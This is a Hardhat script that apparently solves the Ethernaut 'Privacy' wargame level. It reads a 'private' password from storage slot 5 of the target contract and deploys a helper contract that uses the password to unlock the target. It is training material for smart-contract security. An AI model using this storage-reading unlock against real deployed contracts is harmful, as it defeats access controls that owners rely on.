import { ethers } from "hardhat";

const ETHERNAUT_ADDRESS = "";

async function main() {
  // Deploy the Privacy contract
  const Privacy = await ethers.getContractFactory("Privacy");
  const privacy = await Privacy.attach(ETHERNAUT_ADDRESS);
  console.log("Attach Privacy contract at", privacy.address);

  // Get the password in the storage
  const password = await ethers.provider.getStorageAt(ETHERNAUT_ADDRESS, 5);

  // Deploy the UnlockContract and unlock Privacy
  const UnlockContract = await ethers.getContractFactory("UnlockContract");
  const unlockContract = await UnlockContract.deploy(
    ETHERNAUT_ADDRESS,
    password,
    { gasLimit: 1000000 }
  );
  console.log("Deploy UnlockContract contract at", unlockContract.address);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
